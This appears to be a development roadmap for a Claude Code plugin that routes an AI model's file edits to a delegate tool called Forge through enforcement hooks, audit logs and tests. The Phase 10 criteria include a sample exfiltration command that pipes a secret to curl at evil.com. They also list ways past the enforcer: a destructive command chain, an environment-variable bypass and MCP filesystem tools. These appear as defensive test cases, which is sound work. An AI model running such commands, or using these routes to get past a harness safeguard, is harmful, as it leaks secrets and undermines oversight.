# Roadmap: Sidekick — Forge Delegation Mode

## Overview

This roadmap delivers the `/forge` skill and its full supporting infrastructure across four phases. Phase 1 produces a detailed spec and the core skill with Forge configuration files before any implementation touches the running plugin. Phase 2 adds the fallback ladder and skill injection layer. Phase 3 adds the AGENTS.md mentoring loop and token optimization. Phase 4 closes with a test suite that covers all new behavior. The existing `install.sh`, `hooks/hooks.json`, and `skills/forge.md` are never modified. Milestone v1.2 (Phases 6–9) extends the plugin with harness-level delegation enforcement via PreToolUse/PostToolUse hooks, live Forge output visibility, a durable conversation audit index, slash commands for replay and history, and a full v1.2 test suite.

## Phases

**Phase Numbering:**
- Integer phases (1, 2, 3): Planned milestone work
- Decimal phases (2.1, 2.2): Urgent insertions (marked with INSERTED)

Decimal phases appear between their surrounding integers in numeric order.

- [x] **Phase 1: Spec, Core Skill, and Forge Config** - Spec document + `/forge` SKILL.md + `.forge/` configuration files  _(shipped in v1.1.0, 2026-04-13)_
- [x] **Phase 2: Fallback Ladder and Skill Injection** - Guide → Handhold → Take over + selective SKILL.md injection  _(shipped in v1.1.0, 2026-04-13)_
- [x] **Phase 3: AGENTS.md Mentoring and Token Optimization** - Three-tier instruction accumulation + deduplication  _(shipped in v1.1.0, 2026-04-13)_
- [x] **Phase 4: Test Suite** - Full coverage for activation, fallback, injection, and mentoring loop  _(shipped in v1.1.0, 2026-04-13)_
- [x] **Phase 5: Forge Agent Frontmatter + Model ID Patch** - `tools: ["*"]` frontmatter fix + invalid model ID corrections across repo  _(shipped in v1.1.2, 2026-04-17)_
- [x] **Phase 6: Delegation Enforcement Hook + Audit Index** - PreToolUse enforcer hook (`forge-delegation-enforcer.sh`) + UUID injection + `.forge/conversations.idx` audit trail + activation/deactivation lifecycle  _(shipped 2026-04-18)_
- [x] **Phase 7: Live Visibility + Progress Surface + Output Style** - PostToolUse progress-surface hook (`forge-progress-surface.sh`) + SKILL.md STEP 5/6 update + `output-styles/forge.md` narration override + Monitor streaming guidance  _(shipped 2026-04-18)_
- [x] **Phase 8: Slash Commands + Plugin Manifest** - `forge-replay.md` + `forge-history.md` commands + `plugin.json` bumped to v1.2.0 with all new artifacts registered and integrity hashes refreshed  _(shipped 2026-04-18)_
- [x] **Phase 9: v1.2 Test Suite** - Unit + integration tests covering enforcer hook, progress surface, UUID generation, history pruning, and full end-to-end v1.2 delegation flow  _(shipped 2026-04-18)_

## Phase Details

### Phase 1: Spec, Core Skill, and Forge Config
**Goal**: A written spec locks down every interaction contract, and the `/forge` skill exists as a working SKILL.md that users can invoke to activate delegation mode, backed by Forge configuration files in place.
**Depends on**: Nothing (first phase)
**Requirements**: SKIL-01, SKIL-02, SKIL-03, SKIL-04, DLGT-01, DLGT-02, DLGT-03, DLGT-04, DLGT-05, FCFG-01, FCFG-02, FCFG-03, FCFG-04
**Success Criteria** (what must be TRUE):
  1. A spec document exists at `.planning/forge-delegation-spec.md` covering every interaction contract (activation, task prompt format, delegation loop, fallback triggers, skill injection protocol, AGENTS.md write protocol, token budget rules)
  2. User can invoke `/forge` and Claude activates Forge-first delegation mode for the session
  3. Invoking `/forge` on a machine without Forge installed produces a clear health-check error with install instructions rather than a silent failure
  4. User can deactivate Forge-first mode and Claude acknowledges the return to direct mode
  5. `.forge/agents/forge.md`, `.forge.toml`, and `.forge/skills/` exist after first invocation and are not overwritten on subsequent invocations
**Plans**: 3 plans

Plans:
- [x] 01-01: Write forge-delegation-spec.md (interaction contracts, prompt format, fallback triggers, injection protocol, AGENTS.md write rules, token budget rules)  _(shipped in v1.1.0)_
- [x] 01-02: Implement `skills/forge/SKILL.md` — activation, health check, session state, deactivation, and task delegation loop (SKIL-01–04, DLGT-01–05)  _(shipped in v1.1.0)_
- [x] 01-03: Implement Forge configuration files — `.forge/agents/forge.md` override, `.forge.toml` template, `.forge/skills/` bootstrap (FCFG-01–04)  _(shipped in v1.1.0)_

### Phase 2: Fallback Ladder and Skill Injection
**Goal**: When Forge fails, Claude escalates through a defined three-level ladder without user prompting, and before every delegation Claude injects only the skills relevant to the current task.
**Depends on**: Phase 1
**Requirements**: FALL-01, FALL-02, FALL-03, FALL-04, FALL-05, SINJ-01, SINJ-02, SINJ-03, SINJ-04, SINJ-05
**Success Criteria** (what must be TRUE):
  1. On a detectable Forge failure, Claude automatically reframes the prompt with clarifying context and retries without user intervention (Level 1 — Guide)
  2. If Level 1 retry fails, Claude decomposes the task and submits subtasks sequentially (Level 2 — Handhold)
  3. If Level 2 fails after reasonable attempts, Claude performs the task directly and produces a debrief including what Forge learned and a proposed AGENTS.md update (Level 3 — Take over)
  4. Failure detection triggers on: explicit Forge error signals, repeated wrong outputs, and stall conditions — not just on non-zero exit codes
  5. Before each delegation, only skills relevant to the task type are injected into `.forge/skills/` — injected files use Forge-compatible SKILL.md format with no Claude-specific syntax
**Plans**: 2 plans

Plans:
- [x] 02-01: Implement fallback ladder logic in `skills/forge/SKILL.md` — failure detection, Level 1 Guide, Level 2 Handhold, Level 3 Take over + debrief (FALL-01–05)  _(shipped in v1.1.0)_
- [x] 02-02: Build skill injection layer — Claude-to-Forge skill mapping, selective injection, Forge-compatible SKILL.md adapter (SINJ-01–05)  _(shipped in v1.1.0)_

### Phase 3: AGENTS.md Mentoring and Token Optimization
**Goal**: After every task, standing instructions flow into the right tier (global, project, session log) without duplication, and task prompts to Forge stay minimal.
**Depends on**: Phase 2
**Requirements**: AGNT-01, AGNT-02, AGNT-03, AGNT-04, AGNT-05, AGNT-06, AGNT-07, AGNT-08, TOKN-01, TOKN-02, TOKN-03, TOKN-04
**Success Criteria** (what must be TRUE):
  1. After each task, Claude appends extracted standing instructions to both `~/forge/AGENTS.md` and `./AGENTS.md` — and does not re-append content that is semantically equivalent to what already exists
  2. A session log entry is written to `docs/sessions/` capturing the instruction evolution for that session
  3. On first `/forge` invocation with an empty AGENTS.md, Claude bootstraps it from `skills/forge.md` content rather than starting blank
  4. Task prompts submitted to Forge contain only what Forge needs for the task — not full conversation history — and stay within the token budget defined in the spec
  5. `.forge.toml` compaction thresholds (`token_threshold`, `eviction_window`, `retention_window`) are set to tested defaults that prevent Forge context bloat
**Plans**: 2 plans

Plans:
- [x] 03-01: Implement AGENTS.md mentoring loop — extraction protocol, deduplication logic, three-tier write (global, project, session log), bootstrap from forge.md (AGNT-01–08, TOKN-01)  _(shipped in v1.1.0)_
- [x] 03-02: Implement token optimization — minimal task prompt construction, selective injection enforcement, validated `.forge.toml` compaction defaults (TOKN-02–04)  _(shipped in v1.1.0)_

### Phase 4: Test Suite
**Goal**: All new behavior is covered by automated tests that run alongside the existing 43-test suite without breaking it.
**Depends on**: Phase 3
**Requirements**: TEST-01, TEST-02, TEST-03, TEST-04, TEST-05
**Success Criteria** (what must be TRUE):
  1. Running the test suite shows tests for skill activation and deactivation passing (Unit — TEST-01)
  2. Running the test suite shows AGENTS.md deduplication tests passing — duplicate content is provably not re-appended (Unit — TEST-02)
  3. Running the test suite shows skill injection tests passing — correct SKILL.md files appear in the correct locations (Unit — TEST-03)
  4. Running the test suite shows fallback ladder tests passing — Level 1 → 2 → 3 triggers in the correct order under simulated failure conditions (Unit — TEST-04)
  5. Integration tests verify the full delegation loop against a live Forge session and the overall test suite remains at PASS (Integration — TEST-05)
**Plans**: 2 plans

Plans:
- [x] 04-01: Unit tests for skill activation/deactivation, AGENTS.md deduplication, and skill injection (TEST-01–03)  _(shipped in v1.1.0)_
- [x] 04-02: Unit tests for fallback ladder trigger logic + integration test for full delegation loop against live Forge (TEST-04–05)  _(shipped in v1.1.0)_

## Progress

**Execution Order:**
Phases execute in numeric order: 1 → 2 → 3 → 4

| Phase | Plans Complete | Status | Completed |
|-------|----------------|--------|-----------|
| 1. Spec, Core Skill, and Forge Config | 3/3 | Shipped | 2026-04-13 |
| 2. Fallback Ladder and Skill Injection | 2/2 | Shipped | 2026-04-13 |
| 3. AGENTS.md Mentoring and Token Optimization | 2/2 | Shipped | 2026-04-13 |
| 4. Test Suite | 2/2 | Shipped | 2026-04-13 |

### Phase 5: Fix Forge delegation-blocking bugs (v1.1.2 patch): missing tools frontmatter, invalid model IDs in README and vision agent

**Goal:** Ship v1.1.2 patch that restores `/forge` delegation from silent-failure to working end-to-end on fresh installs by adding `tools: ["*"]` to the shipped Forge agent template and correcting the invalid OpenRouter model ID (`qwen/qwen3.6-plus` → `qwen/qwen3-coder-plus`) across README, `skills/forge.md`, `.forge.toml`, and Plan 01-03. Leave the repo ready for `/create-release v1.1.2`.
**Requirements**: FCFG-01, FCFG-02
**Depends on:** Phase 4
**Plans:** 2 plans

Plans:
- [x] 05-01-PLAN.md — Patch shipped artifacts: add `tools: ["*"]` to Forge agent template and replace invalid model ID across 10 references (single atomic fix commit)  _(shipped in 354d001)_
- [x] 05-02-PLAN.md — Release prep: bump README version badge to v1.1.2 and add CHANGELOG 1.1.2 entry (single release-prep commit; user runs `/create-release v1.1.2` afterward)  _(shipped in 3eee7ce)_

**Status:** SHIPPED on 2026-04-17 as v1.1.2. GitHub Release: https://github.com/alo-exp/sidekick/releases/tag/v1.1.2

---

## v1.2 — Forge Delegation + Live Visibility

### Phase Summary

- [x] **Phase 6: Delegation Enforcement Hook + Audit Index** - PreToolUse enforcer hook with UUID injection, allow/deny/rewrite logic, and append-only `.forge/conversations.idx` audit trail; activation/deactivation lifecycle commands updated  _(shipped 2026-04-18)_
- [x] **Phase 7: Live Visibility + Progress Surface + Output Style** - PostToolUse progress-surface hook parsing Forge STATUS blocks; `skills/forge/SKILL.md` STEP 5/6 updated with `run_in_background` + Monitor guidance; `output-styles/forge.md` narration override shipped  _(shipped 2026-04-18)_
- [x] **Phase 8: Slash Commands + Plugin Manifest** - `/forge:replay` and `/forge:history` commands; `plugin.json` bumped to v1.2.0 with all hooks, output style, and commands registered; integrity hashes refreshed  _(shipped 2026-04-18)_
- [x] **Phase 9: v1.2 Test Suite** - Unit tests for both hooks, UUID generation, and history pruning; integration test for full v1.2 end-to-end delegation flow  _(shipped 2026-04-18)_

### Phase Details

#### Phase 6: Delegation Enforcement Hook + Audit Index
**Goal**: When `/forge` mode is active, direct `Write`/`Edit`/`NotebookEdit` calls are deterministically blocked at the harness level, `Bash forge -p` commands are rewritten to inject a valid UUID `--conversation-id` and `--verbose`, read-only Brain-role Bash commands pass through unmodified, and every rewritten Forge invocation is appended to `.forge/conversations.idx`.
**Depends on**: Phase 5
**Requirements**: HOOK-01, HOOK-02, HOOK-03, HOOK-04, HOOK-05, HOOK-06, HOOK-07, HOOK-08, HOOK-09, AUDIT-01, AUDIT-02, AUDIT-03, AUDIT-04, ACT-01, ACT-02, ACT-03
**Success Criteria** (what must be TRUE):
  1. While `/forge` mode is active, submitting a `Write`, `Edit`, or `NotebookEdit` tool call produces a `permissionDecision: "deny"` response with a user-visible reason directing delegation to `forge -p` — the file is never written
  2. A `Bash forge -p "…"` command is transparently rewritten so the actual shell command contains `--conversation-id <lowercase-UUID> --verbose`, and the UUID is a valid RFC 4122 UUID (regex `^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
  3. A `Bash` command that is already a `forge -p` call containing `--conversation-id` is passed through without a second UUID being injected
  4. Read-only Brain-role commands (`git status`, `ls`, `grep`, `cat`, `find`, etc.) are allowed unchanged — the hook emits no decision for them
  5. After a rewritten `forge -p` invocation, `.forge/conversations.idx` gains exactly one new line with format `<ISO8601-UTC> <UUID> <sidekick-tag> <task-hint>`
  6. When `~/.claude/.forge-delegation-active` does not exist, the hook exits 0 and emits no decision for any tool call (no-op mode)
**Plans**: TBD

#### Phase 7: Live Visibility + Progress Surface + Output Style
**Goal**: Forge subprocess output streams into Claude's context in real time via `run_in_background` + Monitor, a PostToolUse hook distills the Forge STATUS block into a formatted `[FORGE-SUMMARY]` with replay hint, and an output-style file shapes Claude's narration tone while `/forge` mode is active — without claiming to style raw tool output.
**Depends on**: Phase 6
**Requirements**: VIS-01, VIS-02, VIS-03, VIS-04, SURF-01, SURF-02, SURF-03, SURF-04, SURF-05, STYLE-01, STYLE-02, STYLE-03, STYLE-04, ACT-04
**Success Criteria** (what must be TRUE):
  1. `skills/forge/SKILL.md` STEP 4 explicitly instructs Claude to use `Bash({ run_in_background: true })` + `Monitor({ shell_id })` for tasks expected to exceed 10 seconds, and documents the foreground Bash fallback for Bedrock/Vertex/Foundry hosts where Monitor is unavailable
  2. When a Forge task completes and the output contains a `STATUS:` block, the PostToolUse hook emits a `[FORGE-SUMMARY]` block as `additionalContext` containing STATUS, FILES_CHANGED, ASSUMPTIONS, PATTERNS_DISCOVERED, and a `Replay: /forge:replay <UUID>` line
  3. The PostToolUse hook is a no-op when `~/.claude/.forge-delegation-active` does not exist or when the originating Bash command did not contain `forge -p`
  4. ANSI escape codes are stripped from Forge output before the STATUS block is parsed (hook uses `sed 's/\x1b\[[0-9;]*m//g'`)
  5. `output-styles/forge.md` exists, contains no claim about styling tool output by line prefix, and instructs Claude to echo `[FORGE]` markers verbatim in markdown quote blocks
  6. Activating `/forge` mode switches the active output style to `forge`; deactivating reverts it to the prior style
**Plans**: TBD

#### Phase 8: Slash Commands + Plugin Manifest
**Goal**: Users can replay any Forge conversation as HTML and browse the project's Forge task history from within Claude Code, and `plugin.json` v1.2.0 registers every new v1.2 artifact with correct integrity hashes so the plugin installs cleanly.
**Depends on**: Phase 7
**Requirements**: REPLAY-01, REPLAY-02, REPLAY-03, REPLAY-04, MAN-01, MAN-02, MAN-03, MAN-04
**Success Criteria** (what must be TRUE):
  1. Running `/forge:replay <UUID>` generates an HTML file at `/tmp/forge-replay-<UUID>.html` via `forge conversation dump <id> --html` and opens it in the default browser; token/cost stats from `forge conversation stats <id> --porcelain` are displayed inline in the Claude turn
  2. Running `/forge:history` renders a table of the last 20 entries from `.forge/conversations.idx`, with each row showing timestamp, sidekick-tag, UUID, task-hint, status, and token count sourced from `forge conversation info <id>`
  3. `/forge:history` prunes index entries older than 30 days from `.forge/conversations.idx` on every invocation, keeping the file bounded
  4. `plugin.json` version field reads `1.2.0`, the hooks array includes both the PreToolUse enforcer (matcher `Write|Edit|NotebookEdit|Bash`) and the PostToolUse progress-surface hook (matcher `Bash`), and the commands and outputStyles arrays list all new v1.2 entries
  5. The existing CI `_integrity` hash check passes with the refreshed SHA-256 values for every new and modified file
**Plans**: TBD

#### Phase 9: v1.2 Test Suite
**Goal**: All v1.2 behavior is covered by automated tests that extend the existing test suite without breaking it, and the full suite remains at PASS.
**Depends on**: Phase 8
**Requirements**: TEST-V12-01, TEST-V12-02, TEST-V12-03, TEST-V12-04, TEST-V12-05
**Success Criteria** (what must be TRUE):
  1. Unit tests for `forge-delegation-enforcer.sh` cover all four decision branches and pass: deny on `Write`/`Edit`/`NotebookEdit` when active; `allow` + `updatedInput.command` rewrite on `forge -p`; passthrough on read-only Bash; idempotent passthrough on already-rewritten commands (TEST-V12-01)
  2. UUID generation tests confirm every generated ID matches the RFC 4122 lowercase UUID regex and that two successive invocations produce distinct values (TEST-V12-02)
  3. Unit tests for `forge-progress-surface.sh` confirm: no-op when inactive; no-op when Bash command lacks `forge -p`; correct STATUS block extraction; ANSI stripping; presence of replay hint in output (TEST-V12-03)
  4. Unit tests for `/forge:history` confirm correct reading of the last 20 index entries and that entries older than 30 days are removed from the file after invocation (TEST-V12-04)
  5. The integration test drives the full v1.2 flow end-to-end — `/forge` activation → `Bash forge -p …` → PreToolUse rewrite → Forge runs → PostToolUse summary emitted → index entry written → `/forge:replay <UUID>` produces HTML — and the complete test suite reports PASS (TEST-V12-05)
**Plans**: TBD

### v1.2 Progress

**Execution Order:**
Phases execute in numeric order: 6 → 7 → 8 → 9

| Phase | Plans Complete | Status | Completed |
|-------|----------------|--------|-----------|
| 6. Delegation Enforcement Hook + Audit Index | 3/3 | Shipped | 2026-04-18 |
| 7. Live Visibility + Progress Surface + Output Style | 3/3 | Shipped | 2026-04-18 |
| 8. Slash Commands + Plugin Manifest | 2/2 | Shipped | 2026-04-18 |
| 9. v1.2 Test Suite | 2/2 | Shipped | 2026-04-18 |

### v1.2 Requirement Coverage

| Requirement | Phase |
|-------------|-------|
| HOOK-01 | Phase 6 |
| HOOK-02 | Phase 6 |
| HOOK-03 | Phase 6 |
| HOOK-04 | Phase 6 |
| HOOK-05 | Phase 6 |
| HOOK-06 | Phase 6 |
| HOOK-07 | Phase 6 |
| HOOK-08 | Phase 6 |
| HOOK-09 | Phase 6 |
| AUDIT-01 | Phase 6 |
| AUDIT-02 | Phase 6 |
| AUDIT-03 | Phase 6 |
| AUDIT-04 | Phase 6 |
| ACT-01 | Phase 6 |
| ACT-02 | Phase 6 |
| ACT-03 | Phase 6 |
| VIS-01 | Phase 7 |
| VIS-02 | Phase 7 |
| VIS-03 | Phase 7 |
| VIS-04 | Phase 7 |
| SURF-01 | Phase 7 |
| SURF-02 | Phase 7 |
| SURF-03 | Phase 7 |
| SURF-04 | Phase 7 |
| SURF-05 | Phase 7 |
| STYLE-01 | Phase 7 |
| STYLE-02 | Phase 7 |
| STYLE-03 | Phase 7 |
| STYLE-04 | Phase 7 |
| ACT-04 | Phase 7 |
| REPLAY-01 | Phase 8 |
| REPLAY-02 | Phase 8 |
| REPLAY-03 | Phase 8 |
| REPLAY-04 | Phase 8 |
| MAN-01 | Phase 8 |
| MAN-02 | Phase 8 |
| MAN-03 | Phase 8 |
| MAN-04 | Phase 8 |
| TEST-V12-01 | Phase 9 |
| TEST-V12-02 | Phase 9 |
| TEST-V12-03 | Phase 9 |
| TEST-V12-04 | Phase 9 |
| TEST-V12-05 | Phase 9 |

---

## v1.3 — Enforcer Hardening + Housekeeping + forge-sb

### Phase Summary

- [x] **Phase 10: Enforcer Hardening + Helper Extraction** — Fix 6 enforcer bugs + codify doc-edit path allowlist + extract helpers to `hooks/lib/enforcer-utils.sh` + expanded test suite + manifest bump to v1.3.0  _(shipped 2026-04-24)_
- [x] **Phase 11: Housekeeping, Hardening & forge-sb** — Credential redaction hardening + SRI integrity + SKILL.md fixes + help site bugs + install.sh fix + SENTINEL file relocation + forge-sb auto-install  _(shipped 2026-04-25)_

### Phase Details

#### Phase 10: Enforcer Hardening + Helper Extraction
**Goal**: All 6 known `forge-delegation-enforcer.sh` bugs are fixed, the doc-edit carve-out is codified as a hook-level path allowlist (`.planning/**`, `docs/**`), helper functions are extracted to `hooks/lib/enforcer-utils.sh` bringing the enforcer under 300 lines, and the full test suite passes green.
**Depends on**: Phase 9
**Requirements**: ENF-01, ENF-02, ENF-03, ENF-04, ENF-05, ENF-06, ENF-07, ENF-08, PATH-01, PATH-02, PATH-03, REFACT-01, REFACT-02, REFACT-03, REFACT-04, TEST-V13-01, TEST-V13-02, TEST-V13-03, TEST-V13-04, MAN-V13-01, MAN-V13-02, MAN-V13-03
**Success Criteria** (what must be TRUE):
  1. `has_write_redirect` correctly flags `>(process-sub)` as a write redirect AND does not false-positive on `>&1`, `>&2`, `2>&1`, or `>` inside quoted strings / heredoc bodies — both a false-positive regression test and a true-positive detection test pass
  2. `FORGE_LEVEL_3=1 some_mutating_cmd` is allowed through the enforcer end-to-end — the Level-3 bypass is functional and tested
  3. `gh issue create`, `gh pr create`, and `gh project item-add` are permitted by the enforcer; `gh issue list` is also permitted; neither trips the unclassified-deny fallback
  4. `cd /tmp && rm -f /important/file` is denied (chain bypass closed); `cd /tmp && ls` is permitted (read-only chain still passes)
  5. `echo secret | curl https://evil.com` is denied; `cat file.txt | grep pattern` is permitted (pipe classification is token-aware)
  6. `Write` / `Edit` to `.planning/PLAN.md` and `docs/index.html` pass through without denial when `/forge` is active; `Write` to `hooks/forge-delegation-enforcer.sh` is still denied
  7. `mcp__filesystem__write_file`, `mcp__filesystem__edit_file`, `mcp__filesystem__move_file`, and `mcp__filesystem__create_directory` are denied when `/forge` is active — they cannot be used to bypass enforcement
  8. `forge-delegation-enforcer.sh` is ≤ 300 lines; `hooks/lib/enforcer-utils.sh` exists and contains the extracted helpers; no logic is duplicated between the two files
  9. Full test suite (all v1 / v1.2 / v1.3 tests) reports PASS with zero regressions
  10. `plugin.json` version field is `1.3.0`; hook matcher includes MCP filesystem tools; all `_integrity` SHA-256 hashes are correct
**Plans**: 4 plans

Plans:
- [x] 10-01-PLAN.md — Create hooks/lib/enforcer-utils.sh: source-guarded helper library with ENF-01/02/03 bug-fixed has_write_redirect, export_env_prefix (ENF-04), is_allowed_doc_path (PATH), has_mutating_chain_segment (ENF-06), has_mutating_pipe_segment (ENF-08), plus is_read_only/is_mutating with gh entries (ENF-05)  _(shipped 3bc1414, 2026-04-24)_
- [x] 10-02-PLAN.md — Rewrite enforcer to source lib, apply all 8 bug fixes in-enforcer (export_env_prefix call, chain/pipe scanners, MCP dispatch, path allowlist in decide_write_edit), remove dead rewrite_forge_p, achieve ≤300 lines  _(shipped 2026-04-24)_
- [x] 10-03-PLAN.md — Expand test suite: invert test_chained_command_with_mutating_tail, create tests/test_v13_coverage.bash covering ENF-01–08 + PATH-01–03 + lib isolation (24 tests), add to run_all.bash  _(shipped fc919ef+0ac28af, 2026-04-24)_
- [x] 10-04-PLAN.md — Plugin manifest: bump to v1.3.0, extend PreToolUse matcher with MCP filesystem tools, refresh _integrity hashes for enforcer and lib; update test_plugin_integrity.bash  _(shipped d89fbd3+4d8288b, 2026-04-24)_

#### Phase 11: Housekeeping, Hardening & forge-sb
**Goal**: All 9 remaining GitHub housekeeping/hardening items are resolved, the forge-sb skill is auto-installed on plugin install, and the full test suite still passes green.
**Depends on**: Phase 10
**Requirements**: STRIP-01, RDRCT-01, SRI-01, SKILL-01, SKILL-02, TEST-RDRCT-01, DOCS-01, INST-01, HOUSE-01, FGSB-01
**Success Criteria** (what must be TRUE):
  1. `strip_ansi` uses `-0777 -pe` (slurp mode) — a STATUS block whose OSC sequence spans two lines is fully stripped and no secret text leaks into `additionalContext`
  2. A `sk-test.with.dots.longer` (14 chars after prefix) is redacted to `[REDACTED-SK-TOKEN]`; a 9-char suffix is NOT redacted (boundary check)
  3. All 6 `docs/help/**/*.html` files have `integrity="sha384-..."` and `crossorigin="anonymous"` on the Lucide `<script>` tag; the hash matches the actual CDN content
  4. SKILL.md Level 3 scope constraint references `$CLAUDE_PROJECT_DIR` explicitly; the governance instruction appears in the Skill Injection section
  5. `tests/test_v12_coverage.bash` has passing tests for `ghs_AAAAAAAAAAAAAAAAAAAA12345` → `[REDACTED-GH-TOKEN]` and `api-key: supersecret` → `api-key: [REDACTED]`
  6. All 6 help pages have `<link rel="icon" href="/favicon.ico">`; `search.js` returns early when `list` or `section` is null; concepts injection table shows `quality-gates + code-review` for "Code change"
  7. `install.sh` temp file line uses `"${TMPDIR:-/tmp}/forge-install.XXXXXX"` (no `.sh` suffix)
  8. All 14 `SENTINEL-audit-forge*.md` files exist under `docs/internal/sentinel/` and are absent from the repo root; `git mv` history preserved
  9. Running `install.sh` executes the forge-sb install script; the curl command uses the exact Silver Bullet URL provided
  10. Full test suite passes with zero regressions after all Phase 11 changes
**Plans**: 4 plans

Plans:
- [ ] 11-01-PLAN.md — Hook hardening: strip_ansi slurp mode (STRIP-01) + sk- regex broadening (RDRCT-01)
- [x] 11-02-PLAN.md — Test coverage: two new redaction tests in test_v12_coverage.bash (TEST-RDRCT-01)  _(shipped 3279c92, 2026-04-24)_
- [ ] 11-03-PLAN.md — Help site SRI + favicon + search.js fix + concepts table + SKILL.md + install.sh mktemp (SRI-01, SKILL-01, SKILL-02, DOCS-01, INST-01)
- [ ] 11-04-PLAN.md — SENTINEL relocation (git mv 14 files) + forge-sb auto-install + plugin.json integrity refresh (HOUSE-01, FGSB-01)

### v1.3 Progress

**Execution Order:**
Phase 10 → Phase 11

| Phase | Plans Complete | Status | Completed |
|-------|----------------|--------|-----------|
| 10. Enforcer Hardening + Helper Extraction | 4/4 | Shipped | 2026-04-24 |
| 11. Housekeeping, Hardening & forge-sb | 2/4 | In progress | — |

### v1.3 Requirement Coverage

| Requirement | Phase |
|-------------|-------|
| ENF-01 – ENF-08 | Phase 10 |
| PATH-01 – PATH-03 | Phase 10 |
| REFACT-01 – REFACT-04 | Phase 10 |
| TEST-V13-01 – TEST-V13-04 | Phase 10 |
| MAN-V13-01 – MAN-V13-03 | Phase 10 |
| STRIP-01 | Phase 11 |
| RDRCT-01 | Phase 11 |
| SRI-01 | Phase 11 |
| SKILL-01, SKILL-02 | Phase 11 |
| TEST-RDRCT-01 | Phase 11 |
| DOCS-01 | Phase 11 |
| INST-01 | Phase 11 |
| HOUSE-01 | Phase 11 |
| FGSB-01 | Phase 11 |
